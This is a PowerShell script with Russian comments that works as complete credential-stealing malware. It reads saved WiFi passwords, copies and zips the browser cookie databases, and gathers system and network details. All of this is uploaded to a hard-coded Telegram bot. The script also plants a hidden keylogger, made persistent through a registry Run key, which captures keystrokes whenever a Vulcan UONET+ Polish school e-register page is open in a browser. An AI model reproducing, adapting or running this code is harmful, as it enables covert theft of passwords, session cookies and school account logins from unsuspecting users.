# Основной сбор данных
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Сеть и WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# ДЕБАГ КЕЙЛОГГЕР - РАБОЧАЯ ВЕРСИЯ
$keyloggerStatus = "Starting DEBUG version..."

# Создаем ДЕБАГ кейлоггер
$keyloggerScript = @"
Add-Type -AssemblyName System.Windows.Forms

# Глобальные переменные
`$global:buffer = ""
`$global:monitoringActive = `$false
`$global:monitorEndTime = `$null
`$global:lastSendTime = Get-Date
`$global:debugCounter = 0

function Send-Telegram {
    param(`$text)
    try {
        `$body = @{
            chat_id = '5674514050'
            text = `$text
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body -TimeoutSec 3
        return `$true
    } catch { 
        return `$false
    }
}

function Get-AllBrowserTitles {
    try {
        `$result = @()
        `$browsers = Get-Process | Where-Object { 
            `$_.ProcessName -match "chrome|firefox|msedge|edge|iexplore|opera|brave" -and
            `$_.MainWindowTitle -ne "" -and
            `$_.MainWindowHandle -ne 0
        }
        
        foreach (`$browser in `$browsers) {
            `$result += "`$(`$browser.ProcessName): `$(`$browser.MainWindowTitle)"
        }
        
        return `$result
    } catch {
        return @("Error getting browser titles")
    }
}

function Check-VulcanSite {
    `$allTitles = Get-AllBrowserTitles
    `$currentTitles = `$allTitles -join " | "
    
    # ДЕБАГ: Отправляем все заголовки каждые 30 проверок
    `$global:debugCounter++
    if (`$global:debugCounter % 30 -eq 0) {
        Send-Telegram "🔍 DEBUG - All browser titles:`n`$(`$allTitles -join "`n")"
    }
    
    # Проверяем конкретные URL
    `$targetPatterns = @(
        "*uonetplus.vulcan.net.pl/minrol*",
        "*uonetplus.vulcan.net.pl/rybnik*", 
        "*uonetplus.vulcan.net.pl/*",
        "*vulcan*",
        "*uonet*",
        "*dziennik*"
    )
    
    foreach (`$title in `$allTitles) {
        foreach (`$pattern in `$targetPatterns) {
            if (`$title -like `$pattern) {
                Send-Telegram "🎯 SITE DETECTED! Pattern: `$pattern`nTitle: `$title"
                return `$true
            }
        }
    }
    
    return `$false
}

function Start-Monitoring {
    `$global:monitoringActive = `$true
    `$global:monitorEndTime = (Get-Date).AddMinutes(2)
    Send-Telegram "🚀 MONITORING STARTED! Will work for 2 minutes until `$(`$global:monitorEndTime.ToString('HH:mm:ss'))"
}

function Stop-Monitoring {
    `$global:monitoringActive = `$false
    `$global:monitorEndTime = `$null
    if (`$global:buffer -ne "") {
        Send-Telegram "📝 FINAL INPUT: `$global:buffer"
        `$global:buffer = ""
    }
    Send-Telegram "🛑 MONITORING STOPPED"
}

function Process-Key {
    param(`$key)
    
    # Обработка специальных клавиш
    switch (`$key.ToString()) {
        "Return" { 
            if (`$global:buffer -ne "") {
                Send-Telegram "↵ ENTER: `$global:buffer"
                `$global:buffer = ""
            }
        }
        "Space" { 
            `$global:buffer += " " 
        }
        "Back" { 
            if (`$global:buffer.Length -gt 0) {
                `$global:buffer = `$global:buffer.Substring(0, `$global:buffer.Length - 1)
            }
        }
        "Tab" { 
            `$global:buffer += "[TAB]"
        }
        "Escape" {
            `$global:buffer = ""
        }
        "LButton" {
            if (`$global:buffer -ne "") {
                Send-Telegram "🖱️ CLICK: `$global:buffer"
                `$global:buffer = ""
            }
        }
        default {
            # Буквы A-Z
            if (`$key -ge 65 -and `$key -le 90) {
                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                `$isCaps = [System.Windows.Forms.Console]::CapsLock
                
                if ((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
                    `$global:buffer += `$key.ToString()
                } else {
                    `$global:buffer += `$key.ToString().ToLower()
                }
            }
            # Цифры 0-9
            elseif (`$key -ge 48 -and `$key -le 57) {
                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                if (`$isShift) {
                    `$global:buffer += `$symbols[`$key - 48]
                } else {
                    `$global:buffer += (`$key - 48).ToString()
                }
            }
            # Специальные символы
            else {
                switch (`$key) {
                    "OemPeriod" { `$global:buffer += "." }
                    "Oemcomma" { `$global:buffer += "," }
                    "OemMinus" { `$global:buffer += "-" }
                    "Oemplus" { `$global:buffer += "=" }
                    "OemQuestion" { `$global:buffer += "/" }
                    "Oemtilde" { `$global:buffer += "`"" }
                    "D1" { `$global:buffer += "1" }
                    "D2" { `$global:buffer += "2" }
                    "D3" { `$global:buffer += "3" }
                    "D4" { `$global:buffer += "4" }
                    "D5" { `$global:buffer += "5" }
                    "D6" { `$global:buffer += "6" }
                    "D7" { `$global:buffer += "7" }
                    "D8" { `$global:buffer += "8" }
                    "D9" { `$global:buffer += "9" }
                    "D0" { `$global:buffer += "0" }
                }
            }
        }
    }
    
    # Автоотправка при длинном вводе
    if (`$global:buffer.Length -gt 20) {
        Send-Telegram "📝 AUTO: `$global:buffer"
        `$global:buffer = ""
    }
}

# Начало работы
Send-Telegram "🔧 DEBUG KEYLOGGER STARTED 
🎯 Monitoring these sites:
• https://uonetplus.vulcan.net.pl/minrol
• https://uonetplus.vulcan.net.pl/rybnik
• https://uonetplus.vulcan.net.pl/
📝 Will send debug info every 30 checks"

`$checkCount = 0
while (`$true) {
    try {
        `$checkCount++
        
        # Проверяем сайт каждые 5 секунд
        if (`$checkCount % 10 -eq 0) {  # 10 * 500ms = 5 seconds
            if (Check-VulcanSite) {
                if (-not `$global:monitoringActive) {
                    Start-Monitoring
                } else {
                    # Обновляем таймер если снова нашли сайт
                    `$global:monitorEndTime = (Get-Date).AddMinutes(2)
                }
            }
        }
        
        # Если мониторинг активен
        if (`$global:monitoringActive) {
            # Проверяем таймер
            if ((Get-Date) -gt `$global:monitorEndTime) {
                Stop-Monitoring
            } else {
                # Перехват всех клавиш
                for (`$i = 8; `$i -le 254; `$i++) {
                    if ([System.Windows.Forms.GetAsyncKeyState]`$i -eq -32767) {
                        `$key = [System.Windows.Forms.Keys]`$i
                        Process-Key -key `$key
                    }
                }
                
                # Автоотправка каждые 10 секунд
                if ((Get-Date) - `$global:lastSendTime -gt [TimeSpan]::FromSeconds(10)) {
                    if (`$global:buffer -ne "") {
                        Send-Telegram "⏰ TIMEOUT: `$global:buffer"
                        `$global:buffer = ""
                    }
                    `$global:lastSendTime = Get-Date
                }
            }
        }
        
        Start-Sleep -Milliseconds 500
        
    } catch {
        # При ошибке ждем и продолжаем
        Start-Sleep -Milliseconds 2000
    }
}
"@

# Сохраняем и запускаем ДЕБАГ кейлоггер
try {
    $keyloggerPath = "$env:TEMP\vulcan_debug.ps1"
    $keyloggerScript | Out-File $keyloggerPath -Encoding UTF8
    
    # Запускаем в отдельном процессе
    $process = Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`"" -PassThru
    
    # Добавляем в автозагрузку
    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`""
    Set-ItemProperty -Path $startupPath -Name "VulcanDebug" -Value $loggerCommand -ErrorAction SilentlyContinue
    
    $keyloggerStatus = "✅ DEBUG KEYLOGGER ACTIVE - Sending browser titles for analysis"
    
    # Тестовое сообщение
    Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{
        chat_id = '5674514050'
        text = "SYSTEM SCAN COMPLETED - DEBUG keylogger started. Open any browser and check Telegram for debug info."
    }
    
} catch {
    $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
}

# Безопасность
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}

# Cookies - создаем ZIP архив для удобной загрузки
$cookies = @()
$temp = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
$zipPath = "$env:TEMP\Cookies_$env:USERNAME.zip"

New-Item -ItemType Directory -Path $temp -Force | Out-Null

# Копируем файлы cookies
$browsers = @(
    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
    @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "cookies.sqlite" -Recurse -ErrorAction 0 | Select-Object -First 1).FullName}
)

foreach ($browser in $browsers) {
    if ($browser.Path -and (Test-Path $browser.Path)) {
        $dest = "$temp\$($browser.Name)_Cookies$(if($browser.Name -eq 'Firefox'){'.sqlite'})"
        Copy-Item $browser.Path $dest -ErrorAction SilentlyContinue
        if (Test-Path $dest) {
            $cookies += $dest
            # Создаем текстовую информацию о файле
            $fileInfo = Get-Item $dest
            "$($browser.Name) Cookies - Size: $([math]::Round($fileInfo.Length/1KB, 2)) KB - Modified: $($fileInfo.LastWriteTime)" | Out-File "$temp\$($browser.Name)_info.txt" -Encoding UTF8
            $cookies += "$temp\$($browser.Name)_info.txt"
        }
    }
}

# Создаем ZIP архив с cookies
try {
    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
        Compress-Archive -Path "$temp\*" -DestinationPath $zipPath -Force
        if (Test-Path $zipPath) {
            $cookies += $zipPath
        }
    }
} catch {}

# Дополнительная информация
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# Формирование и отправка сообщения
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== KEYLOGGER STATUS ===
$keyloggerStatus

=== DEBUG MODE ===
• Отправляет все заголовки браузеров в Telegram
• Поможет определить правильные паттерны для сайтов
• Работает 2 минуты после обнаружения сайта

=== TARGET SITES ===
• https://uonetplus.vulcan.net.pl/minrol
• https://uonetplus.vulcan.net.pl/rybnik
• https://uonetplus.vulcan.net.pl/

=== BROWSER COOKIES ===
Found cookies files: $($cookies.Count)
Files available for download as ZIP archive

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defStatus
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}

# Отправка ZIP архива с cookies
if (Test-Path $zipPath) {
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
            chat_id = '5674514050'
            document = [System.IO.File]::OpenRead($zipPath)
            caption = "📁 COOKIES ARCHIVE - Download and extract to view cookies files"
        }
    } catch {
        # Если не удалось отправить ZIP, отправляем файлы по отдельности
        $cookies | Where-Object {Test-Path $_} | ForEach-Object {
            try {
                Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                    chat_id = '5674514050'
                    document = [System.IO.File]::OpenRead($_)
                    caption = "Cookies file: $(Split-Path $_ -Leaf)"
                }
            } catch {}
        }
    }
} else {
    # Отправка отдельных файлов если ZIP не создался
    $cookies | Where-Object {Test-Path $_} | ForEach-Object {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                chat_id = '5674514050'
                document = [System.IO.File]::OpenRead($_)
                caption = "Cookies file: $(Split-Path $_ -Leaf)"
            }
        } catch {}
    }
}

# Очистка
Start-Sleep 2
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
